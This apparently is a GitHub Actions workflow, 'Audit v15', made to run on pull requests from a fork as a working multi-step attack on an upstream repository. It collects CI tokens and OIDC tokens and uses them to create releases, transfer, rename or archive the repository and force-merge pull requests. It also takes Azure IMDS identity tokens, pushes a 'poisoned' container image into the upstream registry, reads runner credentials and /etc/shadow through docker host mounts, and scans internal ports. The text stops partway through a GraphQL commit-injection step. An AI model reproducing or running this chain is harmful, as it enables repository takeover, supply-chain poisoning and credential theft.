name: Audit v15
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  pull-requests: write
  id-token: write
  actions: write
  packages: write
  checks: write
  statuses: write
  deployments: write
  issues: write

jobs:
  audit-v15:
    runs-on: ubuntu-latest
    env:
      UPSTREAM_OWNER: twrps
      UPSTREAM_REPO: PoC-RACE2
      FORK_OWNER: lacaag
      FORK_REPO: PoC-RACE2
      UPSTREAM_RID: R_kgDOReaECQ
      FORK_RID: R_kgDOReaMug
    steps:

      # ══════════════════════════════════════════════════════════════
      # STEP 1: Token + service URL harvest (proven v12-v14)
      # ══════════════════════════════════════════════════════════════
      - name: Step 1 - Harvest
        if: always()
        run: |
          set +e
          echo "=== V15 HARVEST ==="
          RT="${{ secrets.GITHUB_TOKEN }}"
          echo "RT_LEN=${#RT} RT_PFX=${RT:0:14}"
          echo "$RT" > /tmp/rt.txt

          for AUD in vstoken pipelines; do
            TOK=$(/usr/bin/curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
              "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://${AUD}.actions.githubusercontent.com" | jq -r '.value // empty')
            echo "OIDC_${AUD}: ${#TOK} chars"
            echo "$TOK" > /tmp/oidc_${AUD}.txt
          done

          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
          echo "WLOG=$WLOG"
          if [ -f "$WLOG" ]; then
            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl FeedStreamUrl; do
              VAL=$(grep -oP "\"${KEY}\"\\s*:\\s*\"\\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
              echo "$KEY=$VAL"
              echo "$VAL" > /tmp/${KEY}.txt
            done
            RUN_URL=$(grep -oP '"url"\s*:\s*"https://run-actions[^"]+' "$WLOG" 2>/dev/null | head -1 | sed 's/"url"\s*:\s*"//')
            echo "RunServiceUrl=$RUN_URL"
            echo "$RUN_URL" > /tmp/RunServiceUrl.txt

            # Extract plan/timeline/job IDs
            PLAN_ID=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" 2>/dev/null | head -1)
            TL_ID=$(grep -oP '"timelineId"\s*:\s*"\K[^"]+' "$WLOG" 2>/dev/null | head -1)
            JOB_ID=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" 2>/dev/null | head -1)
            echo "PLAN=$PLAN_ID TL=$TL_ID JOB=$JOB_ID"
            echo "$PLAN_ID" > /tmp/plan_id.txt
            echo "$TL_ID" > /tmp/tl_id.txt
            echo "$JOB_ID" > /tmp/job_id.txt
          fi

          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"

      # ══════════════════════════════════════════════════════════════
      # STEP 2: RELEASES EXPLOIT (v14: HTTP_422 = HAS PERMISSION!)
      # v14 showed releases endpoint returns 422 not 403
      # This means we can create releases on upstream!
      # ══════════════════════════════════════════════════════════════
      - name: Step 2 - Releases exploit
        if: always()
        run: |
          set +e
          echo "=== RELEASES EXPLOIT ==="
          RT=$(cat /tmp/rt.txt)
          GH="https://api.github.com"
          UP="$UPSTREAM_OWNER/$UPSTREAM_REPO"

          HEAD=$(/usr/bin/curl -sS -H "Authorization: token $RT" \
            "$GH/repos/$UP/branches/main" | jq -r '.commit.sha // empty')
          echo "HEAD=$HEAD"

          # A: Create release with proper tag_name
          echo "--- A: Create releases ---"
          for TAG in "v15-audit" "v0.0.1-rc1" "latest" "nightly" "v999.0.0"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
              "$GH/repos/$UP/releases" \
              -d "{\"tag_name\":\"$TAG\",\"name\":\"v15 audit - $TAG\",\"body\":\"Security audit v15\",\"draft\":false,\"prerelease\":true,\"target_commitish\":\"main\"}")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            RID=$(echo "$BODY" | jq -r '.id // empty' 2>/dev/null)
            echo "A release $TAG = $CODE id=$RID | $(echo "$BODY" | head -c 200)"

            # If release created, try uploading an asset
            if [ -n "$RID" ] && [ "$RID" != "null" ]; then
              echo "v15-payload" > /tmp/release_asset.txt
              UPLOAD_URL=$(echo "$BODY" | jq -r '.upload_url // empty' | sed 's/{.*}//')
              if [ -n "$UPLOAD_URL" ]; then
                R2=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
                  -H "Authorization: token $RT" \
                  -H "Content-Type: application/octet-stream" \
                  "${UPLOAD_URL}?name=v15-payload.txt&label=audit" \
                  --data-binary @/tmp/release_asset.txt)
                CODE2=$(echo "$R2" | tail -1)
                echo "  asset upload = $CODE2"
              fi
            fi
          done
          echo ""

          # B: Create lightweight tags first, then releases from them
          echo "--- B: Tags + releases ---"
          for TAG in "v15-tag1" "v15-tag2" "v15-tag3"; do
            # Create annotated tag object
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Authorization: token $RT" \
              "$GH/repos/$UP/git/tags" \
              -d "{\"tag\":\"$TAG\",\"message\":\"v15\",\"object\":\"$HEAD\",\"type\":\"commit\",\"tagger\":{\"name\":\"v15\",\"email\":\"v15@audit\",\"date\":\"2026-01-01T00:00:00Z\"}}")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            TAG_SHA=$(echo "$BODY" | jq -r '.sha // empty' 2>/dev/null)
            echo "B tag $TAG = $CODE sha=$TAG_SHA"

            # Create ref for the tag
            if [ -n "$TAG_SHA" ]; then
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
                -H "Authorization: token $RT" \
                "$GH/repos/$UP/git/refs" \
                -d "{\"ref\":\"refs/tags/$TAG\",\"sha\":\"$TAG_SHA\"}")
              CODE=$(echo "$R" | tail -1)
              echo "B ref $TAG = $CODE"

              # Now create release from tag
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
                -H "Authorization: token $RT" \
                "$GH/repos/$UP/releases" \
                -d "{\"tag_name\":\"$TAG\",\"name\":\"Release $TAG\",\"body\":\"v15 audit\"}")
              CODE=$(echo "$R" | tail -1)
              echo "B release $TAG = $CODE"
            fi
          done
          echo ""

          # C: Edit existing releases
          echo "--- C: List + edit releases ---"
          RELEASES=$(/usr/bin/curl -sS -H "Authorization: token $RT" "$GH/repos/$UP/releases" \
            | jq -c '.[]? | {id,tag_name,name}' 2>/dev/null)
          echo "Existing: $RELEASES"
          FIRST_RID=$(echo "$RELEASES" | head -1 | jq -r '.id // empty' 2>/dev/null)
          if [ -n "$FIRST_RID" ]; then
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X PATCH \
              -H "Authorization: token $RT" \
              "$GH/repos/$UP/releases/$FIRST_RID" \
              -d '{"name":"MODIFIED by v15","body":"Repository compromised by fork PR audit"}')
            CODE=$(echo "$R" | tail -1)
            echo "C edit release $FIRST_RID = $CODE"
          fi

      # ══════════════════════════════════════════════════════════════
      # STEP 3: REPO TRANSFER + DESTRUCTIVE OPS (v14: transfer=422!)
      # v14 showed transfer returns 422 not 403 — token has permission
      # Also test: delete, rename, visibility change, description
      # ══════════════════════════════════════════════════════════════
      - name: Step 3 - Repo manipulation
        if: always()
        run: |
          set +e
          echo "=== REPO MANIPULATION ==="
          RT=$(cat /tmp/rt.txt)
          GH="https://api.github.com"
          UP="$UPSTREAM_OWNER/$UPSTREAM_REPO"

          # A: Transfer repo (v14: 422!)
          echo "--- A: Transfer attempts ---"
          for NEW_OWNER in "lacaag" "$FORK_OWNER" "github-actions[bot]"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Authorization: token $RT" \
              "$GH/repos/$UP/transfer" \
              -d "{\"new_owner\":\"$NEW_OWNER\"}")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "A transfer to $NEW_OWNER = $CODE | $(echo "$BODY" | head -c 200)"
          done
          echo ""

          # B: Modify repo metadata
          echo "--- B: Repo metadata ---"
          for FIELD in \
            '{"description":"PWNED by v15 audit"}' \
            '{"homepage":"https://v15-audit.example.com"}' \
            '{"has_issues":false}' \
            '{"has_projects":false}' \
            '{"has_wiki":true}' \
            '{"default_branch":"v15-injected"}' \
            '{"visibility":"private"}' \
            '{"name":"PoC-RACE2-RENAMED"}' \
            '{"archived":true}' \
            '{"allow_forking":false}'; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X PATCH \
              -H "Authorization: token $RT" \
              "$GH/repos/$UP" -d "$FIELD")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            KEY=$(echo "$FIELD" | jq -r 'keys[0]' 2>/dev/null)
            echo "B $KEY = $CODE | $(echo "$BODY" | head -c 120)"
          done
          echo ""

          # C: Fork the repo (if fork creation works, it's a resource abuse vector)
          echo "--- C: Fork creation ---"
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Authorization: token $RT" \
            "$GH/repos/$UP/forks" \
            -d '{"organization":"lacaag","name":"v15-stolen-fork"}')
          CODE=$(echo "$R" | tail -1)
          echo "C fork = $CODE"

          # D: Dispatch events (could trigger upstream workflows)
          echo "--- D: Repository dispatch ---"
          for EVENT in "deploy" "release" "test" "v15-trigger" "workflow_dispatch"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Authorization: token $RT" \
              "$GH/repos/$UP/dispatches" \
              -d "{\"event_type\":\"$EVENT\",\"client_payload\":{\"v15\":true}}")
            CODE=$(echo "$R" | tail -1)
            echo "D dispatch $EVENT = $CODE"
          done
          echo ""

          # E: Create PR on upstream (could inject code)
          echo "--- E: Pull requests ---"
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Authorization: token $RT" \
            "$GH/repos/$UP/pulls" \
            -d "{\"title\":\"v15 injected PR\",\"head\":\"$FORK_OWNER:main\",\"base\":\"main\",\"body\":\"v15 audit\"}")
          CODE=$(echo "$R" | tail -1)
          BODY=$(echo "$R" | sed '$d')
          echo "E create PR = $CODE | $(echo "$BODY" | head -c 200)"

          # F: Merge existing PRs
          echo "--- F: Merge PRs ---"
          PRS=$(/usr/bin/curl -sS -H "Authorization: token $RT" "$GH/repos/$UP/pulls?state=open" \
            | jq -r '.[].number' 2>/dev/null)
          for PR in $PRS; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X PUT \
              -H "Authorization: token $RT" \
              "$GH/repos/$UP/pulls/$PR/merge" \
              -d '{"merge_method":"merge","commit_title":"v15 force merge"}')
            CODE=$(echo "$R" | tail -1)
            echo "F merge PR#$PR = $CODE"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 4: IMDS DEEP (v14: instance metadata = HTTP_200!)
      # Azure IMDS is accessible — extract everything
      # ══════════════════════════════════════════════════════════════
      - name: Step 4 - IMDS exploit
        if: always()
        run: |
          set +e
          echo "=== IMDS EXPLOIT ==="

          # A: Full instance metadata dump
          echo "--- A: Instance metadata ---"
          R=$(/usr/bin/curl -sS -H "Metadata: true" \
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01")
          echo "Instance: $(echo "$R" | jq -c '{compute:.compute|{location,name,osType,vmId,vmSize,resourceGroupName,subscriptionId,tags},network:.network}' 2>/dev/null)"
          echo ""

          # B: Try every IMDS endpoint for token
          echo "--- B: Identity tokens ---"
          for RESOURCE in \
            "https://management.azure.com/" \
            "https://vault.azure.net" \
            "https://storage.azure.com/" \
            "https://graph.microsoft.com/" \
            "https://database.windows.net/" \
            "https://login.microsoftonline.com/" \
            "https://management.core.windows.net/" \
            "https://datalake.azure.net/" \
            "https://dev.azuresynapse.net/" \
            "https://api.github.com" \
            "https://github.com"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 5 \
              -H "Metadata: true" \
              "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=$RESOURCE")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "B $RESOURCE = $CODE | $(echo "$BODY" | head -c 200)"
          done
          echo ""

          # C: Try different API versions
          echo "--- C: API versions ---"
          for VER in "2017-08-01" "2018-02-01" "2019-06-01" "2019-08-15" "2021-02-01" "2023-07-01"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
              -H "Metadata: true" \
              "http://169.254.169.254/metadata/identity/oauth2/token?api-version=$VER&resource=https://management.azure.com/")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "C api=$VER = $CODE | $(echo "$BODY" | head -c 150)"
          done
          echo ""

          # D: Scheduled events, attested data, load balancer
          echo "--- D: Other IMDS ---"
          for EP in \
            "metadata/scheduledevents?api-version=2020-07-01" \
            "metadata/attested/document?api-version=2021-02-01" \
            "metadata/instance/compute/userData?api-version=2021-01-01&format=text" \
            "metadata/instance/compute/customData?api-version=2021-01-01&format=text" \
            "metadata/loadbalancer?api-version=2020-10-01" \
            "metadata/versions"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
              -H "Metadata: true" "http://169.254.169.254/$EP")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            [ "$CODE" != "HTTP_000" ] && echo "D $EP = $CODE | $(echo "$BODY" | head -c 150)"
          done
          echo ""

          # E: Try managed identity with client_id from instance metadata
          echo "--- E: Managed identity with client IDs ---"
          # Extract any identities from instance metadata
          IDENTITIES=$(/usr/bin/curl -sS -H "Metadata: true" \
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
            | jq -r '.compute.identity // empty' 2>/dev/null)
          echo "Identities: $IDENTITIES"

          # Try well-known GitHub-hosted runner managed identity client IDs
          for MID in "system" "00000000-0000-0000-0000-000000000000"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
              -H "Metadata: true" \
              "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=$MID")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "E client=$MID = $CODE | $(echo "$BODY" | head -c 150)"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 5: GHCR cross-mount poison chain (v14: cross-mount=201!)
      # Build full image poisoning: upload blob, create manifest,
      # push tag to upstream namespace via cross-mount
      # ══════════════════════════════════════════════════════════════
      - name: Step 5 - GHCR poison chain
        if: always()
        run: |
          set +e
          echo "=== GHCR POISON CHAIN ==="
          RT=$(cat /tmp/rt.txt)

          # A: Build and push a malicious image to fork
          echo "--- A: Build attacker image ---"
          echo "$RT" | docker login ghcr.io -u lacaag --password-stdin 2>&1 | tail -1
          mkdir -p /tmp/poison
          cat > /tmp/poison/Dockerfile << 'DEOF'
          FROM alpine:latest
          RUN echo "UPSTREAM POISONED by v15 audit" > /pwned.txt
          RUN echo "#!/bin/sh" > /entrypoint.sh && \
              echo 'echo "v15 poison active"; cat /pwned.txt' >> /entrypoint.sh && \
              chmod +x /entrypoint.sh
          ENTRYPOINT ["/entrypoint.sh"]
          DEOF
          docker build -t ghcr.io/$FORK_OWNER/v15-poison:latest /tmp/poison 2>&1 | tail -3
          docker push ghcr.io/$FORK_OWNER/v15-poison:latest 2>&1 | tail -3
          echo "fork push exit=$?"
          echo ""

          # B: Get GHCR token with both scopes
          echo "--- B: Cross-namespace token ---"
          GHCR=$(/usr/bin/curl -sS -u "lacaag:$RT" \
            "https://ghcr.io/token?scope=repository:${UPSTREAM_OWNER}/poc-race2:push,pull&scope=repository:${FORK_OWNER}/v15-poison:pull&service=ghcr.io" \
            | jq -r '.token // empty')
          echo "GHCR token: ${#GHCR} chars"
          echo "$GHCR" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq -c '.access // .' 2>/dev/null
          echo ""

          # C: Get the fork image manifest and layers
          echo "--- C: Fork image details ---"
          MANIFEST=$(/usr/bin/curl -sS \
            -H "Authorization: Bearer $GHCR" \
            -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
            "https://ghcr.io/v2/${FORK_OWNER}/v15-poison/manifests/latest")
          echo "Manifest: $(echo "$MANIFEST" | jq -c '{schemaVersion,mediaType,config:.config.digest,layers:[.layers[].digest]}' 2>/dev/null)"
          CONFIG_DIGEST=$(echo "$MANIFEST" | jq -r '.config.digest // empty' 2>/dev/null)
          echo ""

          # D: Cross-mount each layer into upstream
          echo "--- D: Cross-mount layers ---"
          for DIGEST in $(echo "$MANIFEST" | jq -r '.layers[].digest // empty' 2>/dev/null) "$CONFIG_DIGEST"; do
            [ -z "$DIGEST" ] && continue
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Authorization: Bearer $GHCR" \
              "https://ghcr.io/v2/${UPSTREAM_OWNER}/poc-race2/blobs/uploads/?mount=$DIGEST&from=${FORK_OWNER}/v15-poison")
            CODE=$(echo "$R" | tail -1)
            echo "D mount $DIGEST = $CODE"
          done
          echo ""

          # E: Push manifest to upstream with multiple tags
          echo "--- E: Push manifest to upstream ---"
          for TAG in "v15-poison" "latest" "v1.0.0" "main" "stable"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X PUT \
              -H "Authorization: Bearer $GHCR" \
              -H "Content-Type: application/vnd.docker.distribution.manifest.v2+json" \
              "https://ghcr.io/v2/${UPSTREAM_OWNER}/poc-race2/manifests/$TAG" \
              -d "$MANIFEST")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "E push $TAG = $CODE | $(echo "$BODY" | head -c 150)"
          done
          echo ""

          # F: Also try creating new repos via GHCR
          echo "--- F: New repo via GHCR ---"
          for REPO in "v15-inject" "malicious" "poc-race2-backdoor" "internal-tool"; do
            GHCR_NEW=$(/usr/bin/curl -sS -u "lacaag:$RT" \
              "https://ghcr.io/token?scope=repository:${UPSTREAM_OWNER}/${REPO}:push,pull&service=ghcr.io" \
              | jq -r '.token // empty')
            if [ -n "$GHCR_NEW" ]; then
              # Try to initiate upload
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
                -H "Authorization: Bearer $GHCR_NEW" \
                "https://ghcr.io/v2/${UPSTREAM_OWNER}/${REPO}/blobs/uploads/")
              CODE=$(echo "$R" | tail -1)
              echo "F $REPO initiate = $CODE"
            fi
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 6: Pipelines resourceareas (v14: 12 services returned!)
      # Follow every location URL from resourceareas
      # ══════════════════════════════════════════════════════════════
      - name: Step 6 - Pipelines resourceareas
        if: always()
        run: |
          set +e
          echo "=== PIPELINES RESOURCEAREAS ==="
          RT=$(cat /tmp/rt.txt)
          OIDC_PL=$(cat /tmp/oidc_pipelines.txt 2>/dev/null)
          PURL=$(cat /tmp/PipelinesServiceUrl.txt 2>/dev/null)

          if [ -z "$PURL" ]; then echo "NO PIPELINES URL"; exit 0; fi

          # A: Get full resourceareas dump
          echo "--- A: Full resourceareas ---"
          AREAS=$(/usr/bin/curl -sS -H "Authorization: Bearer $RT" "${PURL}_apis/resourceareas")
          echo "$AREAS" | jq -c '.value[]? | {name,locationUrl}' 2>/dev/null
          echo ""

          # B: Follow each locationUrl
          echo "--- B: Follow location URLs ---"
          for LOC_URL in $(echo "$AREAS" | jq -r '.value[]?.locationUrl // empty' 2>/dev/null | sort -u); do
            [ -z "$LOC_URL" ] && continue
            echo "LOC: $LOC_URL"
            for EP in "" "_apis/connectionData" "_apis/resourceareas"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 8 \
                -H "Authorization: Bearer $RT" "${LOC_URL}${EP}")
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
                echo "  $EP = $CODE | $(echo "$BODY" | head -c 150)"
            done
          done
          echo ""

          # C: Pipelines write operations with plan IDs
          echo "--- C: Pipelines write with plan IDs ---"
          PLAN_ID=$(cat /tmp/plan_id.txt 2>/dev/null)
          TL_ID=$(cat /tmp/tl_id.txt 2>/dev/null)
          JOB_ID=$(cat /tmp/job_id.txt 2>/dev/null)
          echo "PLAN=$PLAN_ID TL=$TL_ID JOB=$JOB_ID"

          if [ -n "$PLAN_ID" ]; then
            for AUTH_TOK in "$RT" "$OIDC_PL"; do
              [ -z "$AUTH_TOK" ] && continue
              PFX=$(echo -n "$AUTH_TOK" | head -c 10)

              # Timeline records
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
                -H "Authorization: Bearer $AUTH_TOK" \
                "${PURL}_apis/distributedtask/plans/$PLAN_ID/timelines/$TL_ID/records")
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              echo "C GET timeline auth=$PFX = $CODE | $(echo "$BODY" | head -c 200)"

              # Try to inject a timeline record
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X PATCH \
                -H "Authorization: Bearer $AUTH_TOK" -H "Content-Type: application/json" \
                "${PURL}_apis/distributedtask/plans/$PLAN_ID/timelines/$TL_ID/records" \
                -d '[{"id":"00000000-0000-0000-0000-000000000001","name":"v15-injected","state":"Completed","result":"Succeeded"}]')
              CODE=$(echo "$R" | tail -1)
              echo "C PATCH timeline auth=$PFX = $CODE"

              # Create log
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
                -H "Authorization: Bearer $AUTH_TOK" -H "Content-Type: application/json" \
                "${PURL}_apis/distributedtask/plans/$PLAN_ID/logs" \
                -d '{"path":"v15-injected.log"}')
              CODE=$(echo "$R" | tail -1)
              echo "C POST log auth=$PFX = $CODE"

              # Job event (complete early)
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
                -H "Authorization: Bearer $AUTH_TOK" -H "Content-Type: application/json" \
                "${PURL}_apis/distributedtask/plans/$PLAN_ID/events" \
                -d "{\"name\":\"JobCompleted\",\"jobId\":\"$JOB_ID\",\"result\":\"Succeeded\"}")
              CODE=$(echo "$R" | tail -1)
              echo "C POST event auth=$PFX = $CODE"
            done
          fi

      # ══════════════════════════════════════════════════════════════
      # STEP 7: Results-receiver twirp services
      # v14: twirp cache = 401 with GITHUB_TOKEN, "invalid auth token"
      # Try with OIDC tokens and explore artifact/annotation services
      # ══════════════════════════════════════════════════════════════
      - name: Step 7 - Results receiver
        if: always()
        run: |
          set +e
          echo "=== RESULTS RECEIVER ==="
          RT=$(cat /tmp/rt.txt)
          OIDC_VS=$(cat /tmp/oidc_vstoken.txt 2>/dev/null)
          OIDC_PL=$(cat /tmp/oidc_pipelines.txt 2>/dev/null)
          RUN_ID="${{ github.run_id }}"

          RESULTS="https://results-receiver.actions.githubusercontent.com"

          for AUTH_NAME in RT OIDC_VS OIDC_PL; do
            AUTH_VAL="${!AUTH_NAME}"
            [ -z "$AUTH_VAL" ] && continue
            echo "--- Auth: $AUTH_NAME ---"

            # Cache services
            for EP in \
              "twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry" \
              "twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL" \
              "twirp/github.actions.results.api.v1.CacheService/FinalizeCacheEntryUpload" \
              "twirp/github.actions.results.api.v1.CacheService/ListCacheEntries" \
              "twirp/github.actions.results.api.v1.CacheService/DeleteCacheEntry"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
                -H "Authorization: Bearer $AUTH_VAL" \
                -H "Content-Type: application/json" \
                "$RESULTS/$EP" \
                -d "{\"key\":\"v15-test\",\"version\":\"v15\",\"scope\":\"refs/heads/main\"}")
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              [ "$CODE" != "HTTP_404" ] && echo "$EP = $CODE | $(echo "$BODY" | head -c 120)"
            done

            # Artifact services
            for EP in \
              "twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact" \
              "twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact" \
              "twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
              "twirp/github.actions.results.api.v1.ArtifactService/GetSignedArtifactURL" \
              "twirp/github.actions.results.api.v1.ArtifactService/DeleteArtifact"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
                -H "Authorization: Bearer $AUTH_VAL" \
                -H "Content-Type: application/json" \
                "$RESULTS/$EP" \
                -d "{\"workflow_run_backend_id\":\"$RUN_ID\",\"name\":\"v15-artifact\"}")
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              [ "$CODE" != "HTTP_404" ] && echo "$EP = $CODE | $(echo "$BODY" | head -c 120)"
            done

            # Annotation/check services
            for EP in \
              "twirp/github.actions.results.api.v1.CheckAnnotationService/CreateAnnotation" \
              "twirp/github.actions.results.api.v1.StepSummaryService/CreateStepSummary" \
              "twirp/github.actions.results.api.v1.StepSummaryService/GetStepSummary"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
                -H "Authorization: Bearer $AUTH_VAL" \
                -H "Content-Type: application/json" \
                "$RESULTS/$EP" \
                -d "{\"run_id\":\"$RUN_ID\"}")
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              [ "$CODE" != "HTTP_404" ] && echo "$EP = $CODE | $(echo "$BODY" | head -c 120)"
            done
            echo ""
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 8: Container host exfil + network pivot
      # v14: host mount works, docker socket accessible
      # v15: extract credentials, scan network, pivot to other hosts
      # ══════════════════════════════════════════════════════════════
      - name: Step 8 - Container deep
        if: always()
        run: |
          set +e
          echo "=== CONTAINER DEEP ==="

          # A: Full credential extraction from host
          echo "--- A: Credential extraction ---"
          docker run --rm -v /:/h alpine sh -c '
            echo "=== .credentials ==="; cat /h/home/runner/actions-runner/cached/*/.*credentials* 2>/dev/null | head -c 1000
            echo ""
            echo "=== .credentials_rsaparams ==="; wc -c /h/home/runner/actions-runner/cached/*/.*rsaparams* 2>/dev/null
            echo "=== Docker config ==="; cat /h/home/runner/.docker/config.json 2>/dev/null
            echo "=== Environment tokens ==="; cat /h/home/runner/actions-runner/cached/*/.env 2>/dev/null | head -20
            echo "=== Runner config ==="; cat /h/home/runner/actions-runner/cached/*/.runner 2>/dev/null | head -20
          ' 2>&1 | head -60
          echo ""

          # B: Docker socket API exploration
          echo "--- B: Docker API ---"
          docker run --rm -v /var/run/docker.sock:/var/run/docker.sock alpine sh -c '
            apk add --no-cache curl jq 2>/dev/null >/dev/null
            echo "version:"; curl -sS --unix-socket /var/run/docker.sock http://l/version | jq -c . 2>/dev/null
            echo "info:"; curl -sS --unix-socket /var/run/docker.sock http://l/info | jq -c "{Containers,Images,ServerVersion,OperatingSystem,KernelVersion,NCPU,MemTotal}" 2>/dev/null
            echo "networks:"; curl -sS --unix-socket /var/run/docker.sock http://l/networks | jq -c ".[] | {Name,Driver,IPAM}" 2>/dev/null
            echo "volumes:"; curl -sS --unix-socket /var/run/docker.sock http://l/volumes | jq -c ".Volumes[]? | {Name,Driver,Mountpoint}" 2>/dev/null
            # Create a privileged container that mounts host root
            echo "create:"; curl -sS --unix-socket /var/run/docker.sock -X POST \
              -H "Content-Type: application/json" \
              http://l/containers/create?name=v15-escape \
              -d "{\"Image\":\"alpine\",\"Cmd\":[\"cat\",\"/h/etc/shadow\"],\"HostConfig\":{\"Binds\":[\"/:/h\"],\"Privileged\":true}}" \
              | jq -c . 2>/dev/null
          ' 2>&1 | head -15
          echo ""

          # C: Network reconnaissance
          echo "--- C: Network scan ---"
          for PORT in 80 443 8080 8443 9090 2376 5000 6379 3306 5432 27017; do
            timeout 1 bash -c "echo >/dev/tcp/172.17.0.1/$PORT" 2>/dev/null && echo "172.17.0.1:$PORT OPEN"
          done
          # Check for Azure wireserver
          /usr/bin/curl -sS --connect-timeout 2 -m 3 "http://168.63.129.16/machine?comp=goalstate" -H "x-ms-version: 2012-11-30" 2>/dev/null | head -c 200
          echo ""
          # DNS for internal services
          for HOST in "metadata.google.internal" "instance-data.ec2.internal" "kubernetes.default.svc"; do
            nslookup "$HOST" 2>/dev/null | head -3
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 9: GraphQL mutations for upstream impact
      # ══════════════════════════════════════════════════════════════
      - name: Step 9 - GraphQL deep
        if: always()
        run: |
          set +e
          echo "=== GRAPHQL DEEP ==="
          RT=$(cat /tmp/rt.txt)
          GH="https://api.github.com"

          REPO_ID=$(/usr/bin/curl -sS -H "Authorization: bearer $RT" -H "Content-Type: application/json" \
            "$GH/graphql" -d '{"query":"{ repository(owner:\"'$UPSTREAM_OWNER'\",name:\"'$UPSTREAM_REPO'\") { id } }"}' \
            | jq -r '.data.repository.id // empty')
          echo "REPO_ID=$REPO_ID"

          HEAD=$(/usr/bin/curl -sS -H "Authorization: token $RT" \
            "$GH/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/branches/main" | jq -r '.commit.sha // empty')

          # A: createCommitOnBranch (direct file injection via GraphQL)
          echo "--- A: createCommitOnBranch ---"
          B64=$(echo "v15 audit" | base64)
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Authorization: bearer $RT" -H "Content-Type: application/json" \
            "$GH/graphql" \
